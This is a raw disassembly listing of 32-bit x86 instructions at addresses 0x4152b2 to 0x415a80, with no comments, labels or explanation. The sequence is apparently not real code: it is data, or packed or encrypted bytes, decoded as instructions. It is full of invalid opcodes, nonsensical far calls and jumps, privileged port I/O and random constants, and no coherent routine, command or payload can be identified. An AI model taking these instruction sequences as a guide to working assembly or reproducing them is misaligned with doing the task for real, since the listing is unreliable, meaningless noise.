  4152b2:	mul    BYTE PTR [edi-0x53]
  4152b5:	mov    bh,0xdc
  4152b7:	pushf  
  4152b8:	fisubr DWORD PTR [ebx-0x6]
  4152bb:	rol    edi,0xc3
  4152be:	call   0x2b1:0x2151259e
  4152c5:	inc    edx
  4152c6:	ror    BYTE PTR ds:0x664f2bd6,1
  4152cc:	sbb    ch,BYTE PTR [edx-0x189fe074]
  4152d2:	mov    ecx,0x688a232c
  4152d7:	lock aas 
  4152d9:	int    0x29
  4152db:	pop    ecx
  4152dc:	jmp    0x415353
  4152de:	adc    dh,BYTE PTR [esi]
  4152e0:	test   al,0xae
  4152e2:	pop    ebp
  4152e3:	and    DWORD PTR [edi-0x20],edx
  4152e6:	je     0x4152ea
  4152e8:	xchg   esi,eax
  4152e9:	push   0x3f
  4152eb:	sub    al,ch
  4152ed:	imul   esp,DWORD PTR [ebx-0x48dca7b],0xffffffe2
  4152f4:	into   
  4152f5:	ret    
  4152f6:	push   0xffffff84
  4152f8:	jne    0x41527c
  4152fa:	out    dx,eax
  4152fb:	lods   al,BYTE PTR ds:[esi]
  4152fc:	lods   al,BYTE PTR ds:[esi]
  4152fd:	jb     0x4152c7
  4152ff:	jl     0x415344
  415301:	or     al,0xf5
  415303:	dec    ebx
  415304:	test   DWORD PTR [ebp-0xc],ecx
  415307:	jl     0x4152cb
  415309:	adc    al,0x9b
  41530b:	fwait
  41530c:	stos   BYTE PTR es:[edi],al
  41530d:	add    bl,al
  41530f:	push   eax
  415310:	pop    ecx
  415311:	mov    esi,0xf3b56a53
  415316:	push   ss
  415317:	popa   
  415318:	loopne 0x415346
  41531a:	mov    ds:0x48bf764f,al
  41531f:	push   ds
  415320:	test   BYTE PTR [eax+0x6f],0x9f
  415324:	mov    edx,0x6ba6a647
  415329:	or     dl,ah
  41532b:	inc    edx
  41532c:	xchg   ecx,eax
  41532d:	mov    ebx,0xac496e3a
  415332:	xchg   esi,eax
  415333:	clc    
  415334:	out    dx,eax
  415335:	sub    dh,al
  415337:	pop    ebx
  415338:	pop    esp
  415339:	pusha  
  41533a:	sub    al,0x4c
  41533d:	int3   
  41533e:	sti    
  41533f:	fwait
  415340:	das    
  415341:	pop    edi
  415342:	clc    
  415343:	mov    cl,0x22
  415345:	dec    eax
  415346:	inc    eax
  415347:	fnsave [ecx+0x20]
  41534a:	push   eax
  41534b:	fisub  DWORD PTR [ebp-0x41bf4d42]
  415351:	add    ebx,DWORD PTR [ebp-0x5901a30a]
  415357:	dec    ebp
  415358:	clc    
  415359:	push   ecx
  41535a:	lods   eax,DWORD PTR ds:[esi]
  41535b:	shl    DWORD PTR gs:[ecx],cl
  41535e:	sbb    bh,ch
  415360:	sub    ah,ch
  415362:	jnp    0x41535a
  415364:	cld    
  415365:	cwde   
  415366:	imul   esp,DWORD PTR [ebx-0x29f658be],0xffffffbc
  41536d:	out    dx,al
  41536e:	mov    esp,DWORD PTR [edx]
  415370:	shr    DWORD PTR [edi+0x4804136c],cl
  415376:	dec    edx
  415377:	mov    ebx,0x70e36587
  41537c:	adc    edx,edi
  41537e:	inc    esp
  41537f:	sub    al,0xc1
  415381:	pop    ebx
  415382:	xor    DWORD PTR [edx-0x50],esi
  415385:	add    al,0x3c
  415387:	cmp    eax,0x7697e56
  41538c:	jmp    0x4153e5
  41538e:	nop
  41538f:	pop    ecx
  415390:	mov    al,0x22
  415392:	push   ecx
  415393:	xchg   DWORD PTR [ebx+edi*2],edx
  415396:	xchg   edi,eax
  415397:	ficom  DWORD PTR [ebx+ebx*8-0x15]
  41539b:	pop    ebp
  41539c:	adc    dl,dh
  41539e:	popa   
  41539f:	(bad)  
  4153a0:	jmp    0x5ef2242b
  4153a5:	cld    
  4153a6:	test   eax,0x8119d2e2
  4153ab:	lock (bad) 
  4153ad:	bswap  esi
  4153af:	mov    es,WORD PTR [edi+0x7e]
  4153b2:	lods   ax,WORD PTR ds:[esi]
  4153b4:	loope  0x41542f
  4153b6:	rcr    ecx,1
  4153b8:	imul   esi,DWORD PTR [ecx+0x6],0x35
  4153bc:	aam    0x50
  4153be:	pushf  
  4153bf:	std    
  4153c0:	je     0x415376
  4153c2:	sbb    ch,BYTE PTR [edi]
  4153c4:	cwde   
  4153c5:	imul   edi,DWORD PTR [esi+0x636e0a11],0xe6c81cf7
  4153cf:	jg     0x415361
  4153d1:	arpl   WORD PTR [eax+edi*2],si
  4153d4:	mov    eax,ds:0xdd49bc81
  4153d9:	sbb    ah,0xce
  4153dc:	(bad)  
  4153dd:	cmp    eax,0x26314023
  4153e2:	xor    al,0x21
  4153e4:	xchg   esi,eax
  4153e5:	inc    eax
  4153e6:	and    ah,BYTE PTR [edx]
  4153e8:	or     eax,0x7feacd38
  4153ed:	mov    ch,0xfa
  4153ef:	mov    al,BYTE PTR [ecx+0x168f4be2]
  4153f5:	call   0xc2ca:0x32c0f344
  4153fc:	cld    
  4153fd:	sub    ecx,DWORD PTR [eax]
  4153ff:	mov    DWORD PTR [ebx],edx
  415401:	das    
  415402:	mov    cs,WORD PTR [edx-0x59]
  415405:	pop    ebx
  415406:	les    esi,FWORD PTR [ebp+0x6961bd50]
  41540c:	pop    ds
  41540d:	in     al,dx
  41540e:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  415410:	dec    eax
  415411:	scas   al,BYTE PTR es:[edi]
  415412:	outs   dx,BYTE PTR ds:[esi]
  415413:	add    al,BYTE PTR [ebp-0x5a]
  415416:	mov    es,WORD PTR [esi+0x1db8f7b1]
  41541c:	mov    bh,0x90
  41541e:	sub    al,0x44
  415420:	xchg   edx,eax
  415421:	test   ch,dl
  415423:	sbb    BYTE PTR [edi],ah
  415425:	sbb    ch,BYTE PTR [eax+0x23]
  415428:	je     0x4153f8
  41542a:	mov    ebp,0x635e0a29
  41542f:	mov    cl,0x3
  415431:	mov    dh,0x43
  415433:	les    edi,FWORD PTR ds:0x53fe7845
  415439:	pop    esi
  41543a:	push   edx
  41543b:	cmp    al,0x18
  41543d:	mov    ds:0xe559ec69,al
  415442:	js     0x4153f1
  415444:	leave  
  415445:	sub    al,0x4c
  415447:	xor    ch,al
  415449:	jnp    0x41546f
  41544b:	mov    eax,0x166b54ef
  415450:	(bad)  
  415451:	jae    0x415486
  415453:	cld    
  415454:	adc    eax,0x200ff7a7
  415459:	or     al,dh
  41545b:	or     BYTE PTR [eax],ch
  41545d:	sbb    al,0x9c
  41545f:	call   0x7543:0x1de742ac
  415466:	jge    0x4153f3
  415468:	sbb    ebp,DWORD PTR [esi-0x3d]
  41546b:	out    0x9f,al
  41546d:	repnz rcl BYTE PTR [ebx+0x5abd485f],1
  415474:	data16 clc 
  415476:	inc    ecx
  415477:	mov    ah,0xdc
  415479:	sahf   
  41547a:	mov    ds:0x29d0b17a,eax
  41547f:	xchg   edx,eax
  415480:	loop   0x415442
  415482:	jo     0x4154f8
  415484:	lds    esp,FWORD PTR [ecx+eiz*2+0x3c07f427]
  41548b:	jmp    0x415492
  41548d:	mov    dh,0xa7
  41548f:	sahf   
  415490:	lds    eax,FWORD PTR [ebp+0x60]
  415493:	(bad)  
  415494:	push   ebx
  415495:	xor    edx,DWORD PTR [eax-0x321bcc10]
  41549b:	mov    ecx,0xd090d5c4
  4154a0:	mov    esp,0xc5502b2c
  4154a5:	jnp    0x41542c
  4154a7:	fcom   QWORD PTR [ebx-0x5d]
  4154aa:	les    esp,FWORD PTR ds:0xb3397f73
  4154b0:	int    0x38
  4154b2:	cwde   
  4154b3:	sub    ah,BYTE PTR [esi+edi*2-0x5e]
  4154b7:	shl    DWORD PTR [eax-0x5a8378bb],1
  4154bd:	dec    esp
  4154be:	popa   
  4154bf:	(bad)  
  4154c0:	ins    BYTE PTR es:[edi],dx
  4154c1:	mov    edi,?
  4154c3:	push   esp
  4154c4:	jnp    0x415479
  4154c6:	adc    esi,DWORD PTR [ebp-0x1b143c0d]
  4154cc:	jp     0x41551e
  4154ce:	jns    0x4154c1
  4154d0:	push   esp
  4154d1:	ffreep st(4)
  4154d3:	popa   
  4154d4:	and    BYTE PTR [ecx+0x77bcc8ef],dl
  4154da:	push   eax
  4154db:	jne    0x41548e
  4154dd:	retf   0xbdda
  4154e0:	mov    edx,0x297fbc78
  4154e5:	mov    eax,ds:0x1d9f20af
  4154ea:	lds    eax,FWORD PTR [ecx]
  4154ec:	push   0xa4fee66e
  4154f1:	cmp    DWORD PTR [ecx],edi
  4154f3:	mov    DWORD PTR [ebx+0x10],ecx
  4154f6:	and    al,BYTE PTR [edx+edi*4+0x14aa52db]
  4154fd:	mov    esi,0x8251d069
  415502:	fldcw  WORD PTR [eax]
  415504:	mov    eax,ds:0xde3b6443
  415509:	jbe    0x415506
  41550b:	mov    ah,0x29
  41550d:	shl    BYTE PTR [eax-0xa],1
  415510:	mov    eax,0x5af95084
  415515:	dec    ecx
  415516:	mov    ch,0xd7
  415518:	push   cs
  415519:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41551a:	sbb    ebp,DWORD PTR [ebp+0x6c0021b9]
  415520:	cli    
  415521:	xor    ecx,DWORD PTR [eax+eiz*2-0x56]
  415525:	lods   eax,DWORD PTR ds:[esi]
  415526:	push   0x2d
  415528:	adc    al,0x9
  41552a:	and    eax,0x3bae75b5
  41552f:	pushf  
  415530:	int    0x73
  415532:	test   DWORD PTR [ebx-0x21],ecx
  415535:	sub    al,0x8d
  415537:	bound  ebx,QWORD PTR [ebp-0x15]
  41553a:	cmp    al,0xf9
  41553c:	xchg   esi,eax
  41553d:	leave  
  41553e:	idiv   DWORD PTR [edx+0x22]
  415541:	sub    dl,ah
  415543:	fadd   QWORD PTR [edi]
  415545:	push   ebp
  415546:	aas    
  415547:	xor    eax,0x22fb60ed
  41554c:	add    al,0x6
  41554e:	cdq    
  41554f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415550:	xlat   BYTE PTR ds:[ebx]
  415551:	dec    ebp
  415552:	push   ss
  415553:	aas    
  415554:	lods   al,BYTE PTR fs:[esi]
  415556:	or     BYTE PTR [edi+0x6],bh
  415559:	inc    ebp
  41555a:	jae    0x41556c
  41555c:	adc    al,0x99
  41555e:	(bad)  
  41555f:	leave  
  415560:	int    0x25
  415562:	in     eax,0xbf
  415564:	retf   0x9d70
  415567:	jns    0x41553b
  415569:	jo     0x415569
  41556b:	aas    
  41556c:	jno    0x415580
  41556e:	jns    0x415590
  415570:	enter  0x4aec,0x88
  415574:	sti    
  415575:	push   esp
  415576:	sbb    eax,0x28d4b5d5
  41557b:	aas    
  41557c:	lods   eax,DWORD PTR ds:[esi]
  41557d:	add    al,0xae
  41557f:	jb     0x4155d7
  415581:	aaa    
  415582:	lock add ah,BYTE PTR ds:0xd6a686ae
  415589:	pop    ecx
  41558a:	aaa    
  41558b:	mov    dl,0x30
  41558d:	xchg   DWORD PTR [esi+0x7e],edx
  415590:	cmp    ch,bl
  415592:	lods   al,BYTE PTR ds:[esi]
  415593:	aad    0xcb
  415595:	sbb    BYTE PTR es:[ecx+ecx*2],al
  415599:	ret    
  41559a:	imul   esi,DWORD PTR [esi-0x3fe53703],0xffffffe0
  4155a1:	push   ss
  4155a2:	aas    
  4155a3:	(bad)  
  4155a4:	push   edi
  4155a5:	scas   eax,DWORD PTR es:[edi]
  4155a6:	sbb    bl,BYTE PTR [ecx+0x2d72cecf]
  4155ac:	sub    ah,dh
  4155ae:	push   eax
  4155af:	mov    ds:0x7c8b36d7,al
  4155b4:	jnp    0x4155ce
  4155b6:	stos   DWORD PTR es:[edi],eax
  4155b7:	or     DWORD PTR [esi],0xe4a01cd1
  4155bd:	jae    0x4155a2
  4155bf:	mov    ss,WORD PTR [edx+0x4e]
  4155c2:	mov    ecx,DWORD PTR [eax]
  4155c4:	imul   ebp,ecx,0x9
  4155c7:	xchg   esi,eax
  4155c8:	lds    edx,FWORD PTR [eax+0x139df691]
  4155ce:	cmp    eax,0x78cd47f2
  4155d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155d4:	jns    0x415648
  4155d6:	dec    edi
  4155d7:	xchg   ebp,eax
  4155d8:	pop    ebp
  4155d9:	dec    DWORD PTR [ecx-0x4e]
  4155dc:	lock mov al,ds:0xe82778c3
  4155e2:	add    BYTE PTR [eax],bh
  4155e4:	dec    esp
  4155e5:	clc    
  4155e6:	mov    esp,0xcd637643
  4155eb:	xchg   DWORD PTR [edi],ebx
  4155ed:	adc    al,0x19
  4155ef:	jb     0x4155df
  4155f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155f2:	stc    
  4155f3:	(bad)  
  4155f4:	ficomp WORD PTR [edi+eiz*8+0x72]
  4155f8:	add    edx,ebx
  4155fa:	(bad)  
  4155fc:	setns  BYTE PTR [ecx-0x4e]
  415600:	mov    cl,0x95
  415602:	ror    DWORD PTR [edi+0x70],0x8a
  415606:	sub    al,0xd6
  415608:	mov    ah,0xb3
  41560a:	mov    WORD PTR [ecx+0x57204de1],fs
  415610:	sbb    BYTE PTR [ebx],dl
  415612:	push   ebp
  415613:	addr16 mov bh,0xaf
  415616:	(bad)  
  415617:	mov    edx,0x801f4b66
  41561c:	sub    ebx,0x2d
  41561f:	imul   esp,DWORD PTR [ecx+0x53],0x589ce321
  415626:	or     edi,DWORD PTR [esi+esi*8-0x331f3097]
  41562d:	cld    
  41562e:	cld    
  41562f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415630:	enter  0x47c5,0xdf
  415634:	nop
  415635:	out    dx,eax
  415636:	adc    bh,dl
  415638:	pop    eax
  415639:	dec    edx
  41563a:	cmp    DWORD PTR [ebp+0x98356a8],ecx
  415640:	mov    ch,0x64
  415642:	push   eax
  415643:	repz and al,0xce
  415646:	out    0x7b,eax
  415648:	scas   eax,DWORD PTR es:[edi]
  415649:	mov    bh,0xb4
  41564b:	jb     0x4156cc
  41564d:	add    BYTE PTR [ebx+0x3ed70e5a],dh
  415653:	fsub   QWORD PTR [ebx+0x1b]
  415656:	in     eax,0xc2
  415658:	jl     0x41561a
  41565a:	sub    eax,0x8a369c38
  41565f:	in     al,dx
  415660:	loop   0x41567f
  415662:	cdq    
  415663:	add    dh,BYTE PTR [ecx+0x39]
  415666:	cmp    al,0x3a
  415668:	xor    DWORD PTR [eax],0xffffff82
  41566b:	jmp    0xa4f9:0x4fe85933
  415672:	ins    BYTE PTR es:[edi],dx
  415673:	rep lods eax,DWORD PTR ds:[esi]
  415675:	jmp    0x415681
  415677:	xor    ch,BYTE PTR ds:0x5b0cb192
  41567d:	mov    edx,0xaaf45e9a
  415682:	cdq    
  415683:	adc    BYTE PTR [edx+0x717e1dd4],ch
  415689:	adc    DWORD PTR [edi+0x60cb89ef],eax
  41568f:	fsubr  QWORD PTR [ebp-0x7ed03789]
  415695:	retf   
  415696:	pushf  
  415697:	call   0x4c75b7a7
  41569c:	inc    eax
  41569d:	jo     0x415672
  41569f:	call   0xb61b:0x5d0dcd9b
  4156a6:	and    al,0xb5
  4156a8:	pop    edi
  4156a9:	xlat   BYTE PTR ds:[ebx]
  4156aa:	das    
  4156ab:	es addr16 nop
  4156ae:	ja     0x415698
  4156b0:	fsubr  st(4),st
  4156b2:	pop    ss
  4156b3:	push   eax
  4156b4:	add    DWORD PTR [ebp+ecx*4-0x11],ecx
  4156b8:	adc    BYTE PTR [edi+0x5c],dl
  4156bb:	imul   esp,ebx,0xffffffb3
  4156be:	addr16 aad 0x3f
  4156c1:	cmp    DWORD PTR [edx+ebx*1+0x23],edi
  4156c5:	ss loope 0x4156bf
  4156c8:	dec    edi
  4156c9:	xchg   edi,eax
  4156ca:	addr16 call 0xb823:0xd40e
  4156d1:	jmp    0x1c07:0x1dab5c67
  4156d8:	inc    esp
  4156d9:	fs in  eax,dx
  4156db:	or     dh,cl
  4156dd:	das    
  4156de:	xchg   edi,eax
  4156df:	or     al,0xd2
  4156e1:	cmp    DWORD PTR [ebp-0x74605c42],edx
  4156e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156e8:	lods   eax,DWORD PTR ds:[esi]
  4156ea:	or     ah,BYTE PTR ds:0x4d3692d8
  4156f0:	(bad)  
  4156f1:	ja     0x41571d
  4156f3:	fiadd  DWORD PTR [edi-0x29]
  4156f6:	scas   eax,DWORD PTR es:[edi]
  4156f7:	sub    DWORD PTR [edi],esp
  4156f9:	fstp   QWORD PTR [ecx-0x3b]
  4156fc:	mov    ah,0x34
  4156fe:	jl     0x4156bd
  415700:	out    dx,eax
  415701:	aaa    
  415702:	in     eax,0xb7
  415704:	lock fnsave [ecx-0x65e00c0b]
  41570b:	jo     0x41568e
  41570d:	cwde   
  41570e:	out    0x5b,eax
  415710:	inc    ecx
  415711:	push   cs
  415712:	arpl   WORD PTR ds:0x2a9078c8,ax
  415718:	gs xchg esi,eax
  41571a:	cmc    
  41571b:	xchg   BYTE PTR [ebx],dh
  41571d:	xchg   edx,eax
  41571e:	ja     0x4156da
  415720:	cmp    eax,0xfca4d173
  415725:	jge    0x415773
  415727:	adc    eax,0x2dd57c9b
  41572c:	inc    esi
  41572d:	sti    
  41572e:	js     0x415740
  415730:	(bad)  
  415733:	pop    esi
  415734:	mov    ch,al
  415736:	mov    dl,0x93
  415738:	dec    ebp
  415739:	xchg   ecx,eax
  41573a:	pop    edi
  41573b:	int    0xf4
  41573d:	test   al,0xc8
  41573f:	arpl   WORD PTR [ebp-0x22],sp
  415742:	cmp    BYTE PTR [esi+0xc],bl
  415745:	out    0x33,al
  415747:	mov    al,0xdf
  415749:	inc    edi
  41574a:	jmp    0x4156f4
  41574c:	dec    edx
  41574d:	or     al,0x95
  41574f:	dec    ebp
  415750:	repz adc eax,0x6e8a2569
  415756:	(bad)  gs:[esi]
  415759:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41575b:	stos   DWORD PTR es:[edi],eax
  41575c:	sbb    DWORD PTR [esi+ebp*2+0x467d3e51],esi
  415763:	sub    dh,bl
  415765:	push   ecx
  415766:	dec    edi
  415767:	cs inc edi
  415769:	xchg   ch,bh
  41576b:	retf   
  41576c:	lds    edx,FWORD PTR [ebp+eax*4-0x50711993]
  415773:	lds    ebx,FWORD PTR [edx-0x65]
  415776:	mov    bl,0xca
  415778:	xchg   ebx,eax
  415779:	out    0x5a,al
  41577b:	outs   dx,BYTE PTR ds:[esi]
  41577c:	adc    ebx,edx
  41577e:	daa    
  41577f:	jge    0x4157ec
  415781:	into   
  415782:	or     BYTE PTR [edi],cl
  415784:	cld    
  415785:	in     eax,dx
  415786:	out    0xd7,al
  415788:	daa    
  415789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41578a:	aam    0xee
  41578c:	test   eax,0xbbf09e8
  415791:	adc    al,0x33
  415793:	pusha  
  415794:	out    dx,al
  415795:	fs push ebp
  415797:	sbb    dl,dl
  415799:	outs   dx,BYTE PTR ds:[esi]
  41579a:	push   ebx
  41579b:	xor    ch,0xd5
  41579e:	(bad)  
  41579f:	stos   DWORD PTR es:[edi],eax
  4157a0:	ja     0x41576c
  4157a2:	gs inc edi
  4157a4:	mov    al,0x88
  4157a6:	fisttp WORD PTR [ebx+0x3168d9d8]
  4157ac:	into   
  4157ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157ae:	aas    
  4157af:	push   0xcfe71c9d
  4157b4:	fwait
  4157b5:	imul   ebx,DWORD PTR [esi-0x7f7f4ecf],0x10b84694
  4157bf:	or     ebp,edx
  4157c1:	loop   0x4157a9
  4157c3:	in     eax,0x6
  4157c5:	fnsave [ebx+0x97a43c9]
  4157cb:	jns    0x4157f4
  4157cd:	lahf   
  4157ce:	call   0xdb5dfa53
  4157d3:	jge    0x415820
  4157d5:	loope  0x4157e4
  4157d7:	mov    ch,ch
  4157d9:	imul   DWORD PTR [ebx+0x176fc54a]
  4157df:	(bad)  
  4157e0:	(bad)  
  4157e1:	adc    DWORD PTR [ebx+0x16],0xfffffff2
  4157e5:	mov    ebp,?
  4157e7:	xlat   BYTE PTR ds:[bx]
  4157e9:	adc    BYTE PTR [ebp-0x4f],dh
  4157ec:	pop    ds
  4157ed:	fist   WORD PTR [ebx-0x5a15c069]
  4157f3:	jno    0x4157cc
  4157f5:	pop    ebp
  4157f6:	inc    ebp
  4157f7:	jl     0x4157cd
  4157f9:	dec    esp
  4157fa:	(bad)  
  4157fb:	in     eax,dx
  4157fc:	pusha  
  4157fd:	xlat   BYTE PTR ds:[ebx]
  4157fe:	lock pop edx
  415800:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415801:	mov    edi,0xa3311a40
  415806:	xor    al,0x92
  415808:	add    BYTE PTR [edx+edi*4+0x31729e96],dh
  41580f:	sbb    eax,0x4e028b74
  415814:	lods   al,BYTE PTR ds:[esi]
  415815:	bnd jle 0x415835
  415818:	jne    0x415817
  41581a:	jae    0x41583d
  41581c:	mov    ds:0x4678a90f,eax
  415821:	mov    ds:0xf2f39b2d,eax
  415826:	sub    BYTE PTR [ecx+ecx*8+0x3864cdba],ah
  41582d:	cdq    
  41582e:	(bad)  
  41582f:	in     al,dx
  415830:	dec    ecx
  415831:	bound  ecx,QWORD PTR [ecx-0x752df659]
  415837:	call   0x94cc:0xdd87d6cc
  41583e:	jg     0x4157cf
  415840:	inc    edi
  415841:	mov    bl,0x85
  415843:	out    0x58,eax
  415845:	jmp    0x2b1a:0x17f5eaf8
  41584c:	test   BYTE PTR [edx],ah
  41584e:	jae    0x4158a3
  415850:	(bad)  
  415851:	ins    BYTE PTR es:[edi],dx
  415852:	enter  0x7f2f,0x6b
  415856:	call   0x8f7fd8ed
  41585b:	icebp  
  41585c:	add    BYTE PTR [eax],al
  41585e:	add    BYTE PTR [eax],al
  415860:	add    BYTE PTR [eax],al
  415862:	pop    ebp
  415863:	add    DWORD PTR [edx+0x7debdeea],0x4880e6b7
  41586d:	rcr    BYTE PTR [ebp+0x60],cl
  415870:	rcl    BYTE PTR [ebx+eax*8],1
  415873:	pop    edx
  415874:	add    DWORD PTR [eax],eax
  415876:	and    al,BYTE PTR [edi]
  415878:	add    BYTE PTR [eax],al
  41587a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41587b:	sbb    ecx,DWORD PTR [eax]
  41587d:	popa   
  41587e:	push   ds
  41587f:	scas   eax,DWORD PTR es:[edi]
  415880:	inc    eax
  415881:	rcl    DWORD PTR [eax+0xc],cl
  415884:	adc    BYTE PTR [ebp+esi*4-0x11],cl
  415888:	dec    esp
  415889:	add    cl,BYTE PTR [edx]
  41588b:	lock and cl,cl
  41588e:	push   esi
  41588f:	mov    dh,0x46
  415891:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  415893:	hlt    
  415894:	push   ax
  415896:	in     al,dx
  415897:	cdq    
  415898:	inc    ecx
  415899:	rcr    DWORD PTR [ebx-0x22f6049f],1
  41589f:	xchg   ecx,eax
  4158a0:	pop    edx
  4158a1:	fnstcw WORD PTR [ebx+0x7b]
  4158a4:	nop
  4158a5:	cwde   
  4158a6:	mov    ds:0xc981e6c,eax
  4158ab:	js     0x41591b
  4158ad:	or     eax,0xbb288511
  4158b2:	imul   ecx,DWORD PTR [edx-0x3eb354d8],0xfffffffa
  4158b9:	inc    eax
  4158ba:	push   ss
  4158bb:	neg    esi
  4158bd:	adc    eax,0x776a4d7f
  4158c2:	rol    ah,cl
  4158c4:	(bad)  
  4158c6:	fmul   QWORD PTR [esi]
  4158c8:	and    al,0xd4
  4158ca:	loope  0x415914
  4158cc:	out    dx,eax
  4158cd:	xor    eax,0xebc1d3d6
  4158d2:	xor    DWORD PTR [ecx-0x17],esp
  4158d5:	fs push ss
  4158d7:	xor    ecx,ebp
  4158d9:	push   ebx
  4158da:	ins    DWORD PTR es:[edi],dx
  4158db:	lds    edi,FWORD PTR [ebp+0x30087568]
  4158e1:	sub    DWORD PTR [eax],esp
  4158e3:	hlt    
  4158e4:	repz jl 0x4158aa
  4158e7:	adc    bh,BYTE PTR [eax+0x35]
  4158ea:	cwde   
  4158eb:	loope  0x41593c
  4158ed:	pop    esi
  4158ee:	adc    al,0x68
  4158f0:	jmp    0x7431:0xfa8273a0
  4158f7:	cs inc esi
  4158f9:	(bad)  
  4158fa:	cmp    DWORD PTR [edi+0x5f],esi
  4158fd:	fisttp QWORD PTR ds:0x5f2c88e3
  415903:	imul   ecx,DWORD PTR [ecx],0xffffffde
  415906:	js     0x4158f2
  415908:	and    eax,0x9c253997
  41590d:	loop   0x415930
  41590f:	mov    eax,ds:0xfde851bd
  415914:	push   edi
  415915:	dec    ebx
  415916:	add    eax,0xd20bc95e
  41591b:	and    BYTE PTR [edi],al
  41591d:	enter  0x8150,0x30
  415921:	add    esi,DWORD PTR [ebp-0x2af34579]
  415927:	mov    dl,0x76
  415929:	test   DWORD PTR [eax],ebp
  41592b:	repnz xchg esp,eax
  41592d:	sub    dh,BYTE PTR [ebx-0x51]
  415930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415931:	mov    dl,0x24
  415933:	fdivp  st(2),st
  415935:	enter  0xb1bb,0xe9
  415939:	add    eax,0xac2eb3d3
  41593e:	mov    dh,0x5d
  415940:	imul   eax,DWORD PTR [ebp+0x6ef628a2],0xe0e78faf
  41594a:	mov    cl,dl
  41594c:	test   edx,0x1786553a
  415952:	push   esp
  415953:	sub    ecx,esi
  415955:	and    bl,BYTE PTR [ecx+0x21]
  415958:	sub    ch,dh
  41595a:	imul   ebp,edi,0xfffffffa
  41595d:	pop    ebx
  41595e:	popa   
  41595f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415960:	xor    DWORD PTR [edx-0x4b],esp
  415963:	sub    eax,0x503bc9aa
  415968:	(bad)  
  415969:	outs   dx,DWORD PTR ds:[esi]
  41596a:	daa    
  41596b:	aaa    
  41596c:	hlt    
  41596d:	mov    bl,0xb0
  41596f:	push   ds
  415970:	xor    DWORD PTR [edi+0x2f7bb231],ecx
  415976:	out    dx,eax
  415977:	mov    eax,ds:0x4845e66
  41597c:	pop    di
  41597e:	ficom  DWORD PTR [eax+eax*1]
  415981:	cwde   
  415982:	ss push 0x36c1a30
  415988:	das    
  415989:	fwait
  41598a:	inc    edx
  41598b:	(bad)  
  41598c:	lea    esp,ds:0xb69b8836
  415992:	lahf   
  415993:	mov    esi,0xcb64728d
  415998:	stos   BYTE PTR es:[edi],al
  415999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41599a:	sbb    bl,bl
  41599c:	and    ebp,DWORD PTR ds:0x5c1056a4
  4159a2:	scas   eax,DWORD PTR es:[edi]
  4159a3:	call   0xdbeb:0xd5b506ac
  4159aa:	sub    BYTE PTR [edi+edi*1-0x4d],dl
  4159ae:	sub    ch,BYTE PTR [eax-0x142010a4]
  4159b4:	mov    esp,0xb68e8f66
  4159b9:	imul   ebx,DWORD PTR [eax+0x16c09e3a],0xb
  4159c0:	sbb    al,0x78
  4159c2:	xor    al,0xc4
  4159c4:	mov    esp,0xcc8d5f16
  4159c9:	mov    al,ds:0x74ffd1c5
  4159ce:	icebp  
  4159cf:	cdq    
  4159d0:	add    al,0x8b
  4159d2:	jmp    0x41599e
  4159d4:	mov    esi,0xd3458e01
  4159d9:	adc    eax,0x97f03337
  4159de:	mov    edx,0xbbac0a74
  4159e3:	pop    eax
  4159e4:	retf   0x21
  4159e7:	rol    edi,1
  4159e9:	push   0xffffffd8
  4159eb:	jmp    0x415a30
  4159ed:	mov    ebx,0x3cb1281c
  4159f2:	sub    ebx,edi
  4159f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159f5:	mov    cl,0x8b
  4159f7:	retf   
  4159f8:	jns    0x415a10
  4159fa:	pop    es
  4159fb:	shl    BYTE PTR [edx],1
  4159fd:	cwde   
  4159fe:	cmp    dl,BYTE PTR [edx]
  415a00:	jl     0x4159fe
  415a02:	adc    al,0xe2
  415a04:	leave  
  415a05:	(bad)  
  415a06:	call   0xca53e75b
  415a0b:	inc    ecx
  415a0c:	jecxz  0x4159cf
  415a0e:	push   ecx
  415a0f:	inc    eax
  415a10:	bound  ebp,QWORD PTR [ebx-0x6024ed96]
  415a16:	push   esp
  415a17:	lea    edi,[ecx-0x1ce54225]
  415a1d:	call   0x9911:0xc0d194ae
  415a24:	call   0x571d046d
  415a29:	sub    esp,DWORD PTR [ecx]
  415a2b:	outs   dx,BYTE PTR ds:[esi]
  415a2c:	jg     0x4159c1
  415a2e:	popf   
  415a2f:	cs mov dh,0xa7
  415a32:	sbb    ch,BYTE PTR [ecx+0x27942f24]
  415a38:	lahf   
  415a39:	cwde   
  415a3a:	pop    edx
  415a3b:	pusha  
  415a3c:	xor    eax,DWORD PTR [ecx]
  415a3e:	inc    ebp
  415a3f:	cli    
  415a40:	bound  eax,QWORD PTR [ebx*1+0x387894ac]
  415a47:	or     BYTE PTR [ecx+0x6958ad8e],al
  415a4d:	cmc    
  415a4e:	lods   eax,DWORD PTR ds:[esi]
  415a4f:	les    edi,FWORD PTR [esi-0x80]
  415a52:	and    al,0xf
  415a54:	test   DWORD PTR [esi+0x4e],esi
  415a57:	push   cs
  415a58:	add    al,0x9a
  415a5a:	adc    edx,DWORD PTR [edi+0x41]
  415a5d:	xor    al,0xc2
  415a5f:	outs   dx,DWORD PTR ds:[esi]
  415a60:	sbb    ecx,0xb956814b
  415a66:	fstp   QWORD PTR [eax+0x247787a8]
  415a6c:	xchg   edx,eax
  415a6d:	loopne 0x415a2d
  415a6f:	mov    ds:0xc01a4363,al
  415a74:	das    
  415a75:	ficomp DWORD PTR [edx-0x10c9e5a2]
  415a7b:	daa    
  415a7c:	enter  0xbe4c,0x6f
  415a80:	mov    WORD PTR [edi+eax*4+0x47774510],gs
